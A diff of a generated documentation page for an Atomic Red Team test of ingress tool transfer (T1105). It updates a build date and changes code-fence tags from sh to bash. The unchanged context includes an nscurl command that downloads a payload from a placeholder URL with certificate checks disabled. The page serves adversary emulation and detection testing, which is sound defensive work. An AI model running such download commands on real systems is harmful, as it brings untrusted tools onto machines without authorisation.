@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "5bcefe5f-3f30-4f1c-a61a-8d7db3f4450c"
@@ -60,13 +60,13 @@ Use nscurl to download and write a file/payload from the internet.
 
 ### Command
 
-```sh
+```bash
 nscurl -k "#{remote_file}" -o "#{destination_path}"
 ```
 
 ### Cleanup
 
-```sh
+```bash
 rm "#{destination_path}"
 ```
 
